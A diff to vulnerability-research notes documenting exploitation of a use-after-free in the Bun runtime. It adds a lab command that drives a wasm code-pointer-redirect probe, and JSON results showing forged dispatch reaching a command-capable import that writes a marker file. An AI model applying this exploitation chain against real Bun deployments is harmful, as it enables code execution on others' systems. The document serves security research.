@@ -211,6 +211,56 @@ That establishes the expected NX/W^X boundary for direct ArrayBuffer shellcode.
 The useful primitive is therefore forged dispatch to already-executable wasm/JIT
 code pointers, not direct execution from JS heap data.
 
+## Command-marker import mode
+
+A command-marker mode confirms that the corrupted dispatch can reach a
+command-capable host import when that import is provided by the local JS
+environment. This is a command side effect through the memory-corruption path,
+but it still relies on an attacker-provided JS import and should not be framed
+as standalone native shellcode execution.
+
+Command:
+
+```sh
+rm -f /tmp/bun_uaf_noffi_wasm_marker /tmp/bun_uaf_noffi_command_marker
+ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
+TIMEOUT=240 MARKER_IMPORT=1 COMMAND_IMPORT=1 \
+FAKE_DESCRIPTOR=1 FAKE_DESCRIPTOR_MODE=replacement \
+MARKER_PATH=/tmp/bun_uaf_noffi_wasm_marker \
+COMMAND_MARKER_PATH=/tmp/bun_uaf_noffi_command_marker \
+MARKER_COMMAND="printf 'noffi-command:%s\n' \"$$\" > /tmp/bun_uaf_noffi_command_marker" \
+lab/scripts/triage.sh \
+  lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js
+```
+
+Run:
+
+`lab/findings/runs/20260510T090903Z-2810/asan.log`
+
+Key facts:
+
+```json
+{
+  "commandImport": true,
+  "commandMarkerPath": "/tmp/bun_uaf_noffi_command_marker",
+  "commandMarkerBefore": false,
+  "commandMarkerAfter": true,
+  "commandResultAfter": { "status": 0, "error": null },
+  "fakeDescriptor": true,
+  "effectiveReplacementPatchValue": "0x00006020001a6b30",
+  "patchedA": 7,
+  "restoredA": 42,
+  "ok": true
+}
+```
+
+Filesystem side effects from the representative run:
+
+```text
+/tmp/bun_uaf_noffi_command_marker: noffi-command:<pid>
+/tmp/bun_uaf_noffi_wasm_marker: wasm-marker:<pid>
+```
+
 ## Current impact
 
 Confirmed:
@@ -220,6 +270,8 @@ Confirmed:
 * no-FFI redirect from one same-signature wasm export body to another
 * no-FFI forged wasm dispatch descriptor in attacker-controlled ArrayBuffer data
 * marker file creation through the redirected wasm export path
+* command-marker creation through a redirected wasm import path when the local
+  JS environment provides the command-capable import
 * clean restoration of the corrupted export metadata after the call
 
 Not demonstrated:
